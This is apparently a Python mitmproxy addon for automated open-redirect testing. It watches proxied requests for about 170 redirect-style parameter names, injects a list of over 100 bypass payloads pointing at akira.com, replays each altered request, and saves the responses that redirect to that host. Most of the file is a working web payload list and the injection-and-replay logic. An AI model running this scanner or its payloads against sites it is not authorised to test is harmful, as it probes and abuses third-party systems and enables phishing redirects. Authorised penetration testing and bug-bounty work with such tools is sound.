from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import re
import urllib.parse
import json
import time

class OpenRedirect:
    def __init__(self):
        self.flow_dir_openred = "openredirect"
        os.makedirs(self.flow_dir_openred, exist_ok=True)

        # Corrected the invalid escape sequences and changed some strings to raw strings
        self.payload_template_openred = [
    "//akira.com/%2f..",
    r"//{host}@akira.com/%2f..",
    "///akira.com/%2f..",
    r"///{host}@akira.com/%2f..",
    "////akira.com/%2f..",
    r"////{host}@akira.com/%2f..",
    "https://akira.com/%2f..",
    r"https://{host}@akira.com/%2f..",
    "/https://akira.com/%2f..",
    r"/https://{host}@akira.com/%2f..",
    "//www.akira.com/%2f%2e%2e",
    r"//{host}@www.akira.com/%2f%2e%2e",
    "///www.akira.com/%2f%2e%2e",
    r"///{host}@www.akira.com/%2f%2e%2e",
    "////www.akira.com/%2f%2e%2e",
    r"////{host}@www.akira.com/%2f%2e%2e",
    "https://www.akira.com/%2f%2e%2e",
    r"https://{host}@www.akira.com/%2f%2e%2e",
    "/https://www.akira.com/%2f%2e%2e",
    r"/https://{host}@www.akira.com/%2f%2e%2e",
    "//akira.com/",
    r"//{host}@akira.com/",
    "///akira.com/",
    r"///{host}@akira.com/",
    "////akira.com/",
    r"////{host}@akira.com/",
    "https://akira.com/",
    r"https://{host}@akira.com/",
    "/https://akira.com/",
    r"/https://{host}@akira.com/",
    "//akira.com//",
    r"//{host}@akira.com//",
    "///akira.com//",
    r"///{host}@akira.com//",
    "////akira.com//",
    r"////{host}@akira.com//",
    "https://akira.com//",
    r"https://{host}@akira.com//",
    "//https://akira.com//",
    r"//https://{host}@akira.com//",
    "//www.akira.com/%2e%2e%2f",
    r"//{host}@www.akira.com/%2e%2e%2f",
    "///www.akira.com/%2e%2e%2f",
    r"///{host}@www.akira.com/%2e%2e%2f",
    "////www.akira.com/%2e%2e%2f",
    r"////{host}@www.akira.com/%2e%2e%2f",
    "https://www.akira.com/%2e%2e%2f",
    r"https://{host}@www.akira.com/%2e%2e%2f",
    "//https://www.akira.com/%2e%2e%2f",
    r"//https://{host}@www.akira.com/%2e%2e%2f",
    "///www.akira.com/%2e%2e",
    r"///{host}@www.akira.com/%2e%2e",
    "////www.akira.com/%2e%2e",
    r"////{host}@www.akira.com/%2e%2e",
    "https:///www.akira.com/%2e%2e",
    r"https:///{host}@www.akira.com/%2e%2e",
    "//https:///www.akira.com/%2e%2e",
    r"//{host}@https:///www.akira.com/%2e%2e",
    "/https://www.akira.com/%2e%2e",
    r"/https://{host}@www.akira.com/%2e%2e",
    "///www.akira.com/%2f%2e%2e",
    r"///{host}@www.akira.com/%2f%2e%2e",
    "////www.akira.com/%2f%2e%2e",
    r"////{host}@www.akira.com/%2f%2e%2e",
    "https:///www.akira.com/%2f%2e%2e",
    r"https:///{host}@www.akira.com/%2f%2e%2e",
    "/https://www.akira.com/%2f%2e%2e",
    r"/https://{host}@www.akira.com/%2f%2e%2e",
    "/https:///www.akira.com/%2f%2e%2e",
    r"/https:///{host}@www.akira.com/%2f%2e%2e",
    "/%09/akira.com",
    r"/%09/{host}@akira.com",
    "//%09/akira.com",
    r"//%09/{host}@akira.com",
    "///%09/akira.com",
    r"///%09/{host}@akira.com",
    "////%09/akira.com",
    r"////%09/{host}@akira.com",
    "https://%09/akira.com",
    r"https://%09/{host}@akira.com",
    "/%5cakira.com",
    r"/%5c{host}@akira.com",
    "//%5cakira.com",
    r"//%5c{host}@akira.com",
    "///%5cakira.com",
    r"///%5c{host}@akira.com",
    "////%5cakira.com",
    r"////%5c{host}@akira.com",
    "https://%5cakira.com",
    r"https://%5c{host}@akira.com",
    "/https://%5cakira.com",
    r"/https://%5c{host}@akira.com",
    "https://akira.com",
    r"https://{host}@akira.com",
    "//akira.com",
    "https:akira.com",
    r"\/\/akira.com/",
    r"/\/akira.com/",
    r"https://{host}/https://www.akira.com/",
    "〱akira.com",
    "〵akira.com",
    "ゝakira.com",
    "ーakira.com",
    "ｰakira.com",
    "/〱akira.com",
    "/〵akira.com",
    "/ゝakira.com",
    "/ーakira.com",
    "/ｰakira.com",
    "<>//akira.com",
    r"//akira.com\@{host}",
    r"https://:@akira.com\@{host}",
    r"http://akira.com:80#@{host}/",
    r"http://akira.com:80?@{host}/",
    r"http://akira.com\{host}",
    r"http://akira.com&{host}",
    "http:///////////akira.com",
    r"\\akira.com",
    r"http://{host}.akira.com"
]

        self.altered_header_openred = "x-altered-openred"
        self.watched_parameters_openred = ["outurl", "redirectionURL", "refURL", "returnURL", "siteurl", "targetURL", "urlTo", "redirectLocation", "redirectPage", "redirectPath", "redirectUrlTo", "urlRedirect", "redirectTo", "linkTo", "urlOut", "outboundUrl", "navTo", "jumpTo", "clickTo", "linkURL", "directTo", "moveTo", "outgoing_url", "outbound_link", "location_to", "forward", "from_url", "go", "goto", "host", "html", "image_url", "img_url", "load_file", "load_url", "login?to", "login_url", "logout", "navigation", "next", "next_page", "out", "page", "page_url", "path", "port", "redir", "redirect", "redirect_to", "redirect_uri", "redirect_url", "reference", "return", "returnTo", "return_path", "return_to", "return_url", "rt", "rurl", "show", "site", "target", "to", "uri", "url", "val", "validate", "view", "window", "location", "link", "click", "move", "jump", "follow", "nav", "ref", "locationURL", "redirectURL", "redirect_to_url", "pageurl", "navigate", "returnUrl", "redirectlink", "redirection", "referral", "direct", "forwardto", "gotoURL", "outlink", "targ", "linkto", "sendto", "dest", "destURL", "destination", "finalURL", "newUrl", "goToUrl", "navToURL", "referralURL", "returnURI", "uri_redirect", "path_redirect", "url_redirect", "location_redirect", "returnPath", "returnToURL", "outgoingURL", "redirectURI", "redirect_path", "redirect_url_path", "targetPath", "clickTarget", "followURL", "linkOut", "location_href", "jumpURL", "returnLink", "refLink", "sendURL", "url_destination", "redirect_destination", "goto_url", "forward_url", "nav_to", "move_to_url", "url_location", "redirect_location", "target_url", "target_link", "return_url_path", "return_to_path", "outgoing_link", "link_destination", "click_destination", "redirector", "redirection_link", "uri_location", "url_path", "path_to", "path_redirector", "go_url", "forward_link", "location_path"]

    def response(self, flow: http.HTTPFlow) -> None:
        if self.altered_header_openred in flow.request.headers:
            self.check_altered_reflection_openred(flow)
            return

        if flow.request.method in ["GET", "POST"]:
            self.process_parameters_openred(flow)

    def process_parameters_openred(self, flow):
        params = {}
        if flow.request.method == "GET":
            params = flow.request.query
        elif flow.request.method == "POST":
            content_type = flow.request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(flow.request.get_text())
            elif "application/json" in content_type:
                try:
                    params = json.loads(flow.request.get_text())
                    if not isinstance(params, dict):
                        params = {}
                except json.JSONDecodeError:
                    ctx.log.info("JSON decode error")
                    params = {}

        for watched_param in self.watched_parameters_openred:
            for actual_param in params:
                if re.match(r"^{}$".format(watched_param), actual_param, re.IGNORECASE):
                    value = params[actual_param][0] if isinstance(params[actual_param], list) else params[actual_param]
                    self.alter_and_replay_openred(flow, actual_param, value)
                    break  # Assuming one match is sufficient per parameter


    def alter_and_replay_openred(self, original_flow, param, original_value):
        host = original_flow.request.host
        for template in self.payload_template_openred:
            altered_value = template.format(host=host)
            altered_flow = self.alter_request_openred(original_flow, param, altered_value)
            if altered_flow:
                ctx.master.commands.call("replay.client", [altered_flow])

    def alter_request_openred(self, original_flow, param, altered_value):
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(new_request.get_text())
                params[param] = [altered_value]
                new_request.text = urllib.parse.urlencode(params, doseq=True)
            elif "application/json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    if param in body and isinstance(body[param], str):
                        body[param] = altered_value
                        new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass
        new_request.headers[self.altered_header_openred] = "true"
        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow

    def check_altered_reflection_openred(self, flow):
        # Corrected the indentation and the regex pattern
        pattern = r'^https?:\/\/(www\.)?akira\.com'
        location = flow.response.headers.get("Location", "")
        if re.search(pattern, location):
            self.save_flow_openred(flow)
            return

        response_text = flow.response.get_text()
        redirect_patterns = [
            r'window\.location\.replace\s*\(\s*"https?:\/\/(www\.)?akira\.com"\s*\)',
            r'window\.location\.replace\s*\(\s*"https?:\/\/(www\.)?akira\.com"\s*\)',
            r'window\.location\.href\s*=\s*"/www.akira.com"',
            r'window\.location\.href\s*=\s*"/akira.com"',
            r'window\.location\.replace\s*\(\s*"/www.akira.com"\s*\)',
            r'window\.location\.replace\s*\(\s*"/akira.com"\s*\)',
            r'href="https?:\/\/(www\.)?akira\.com"',
            r'src="https?:\/\/(www\.)?akira\.com"',
            r'src="\/akira\.com"',
            r'href="\/akira\.com"'
        ]
        for pattern in redirect_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                self.save_flow_openred(flow)
                break

    def save_flow_openred(self, flow):
        filename = os.path.join(self.flow_dir_openred, f"openredirect_request_{int(time.time())}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"Saved openred flow to {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")

addons = [OpenRedirect()]
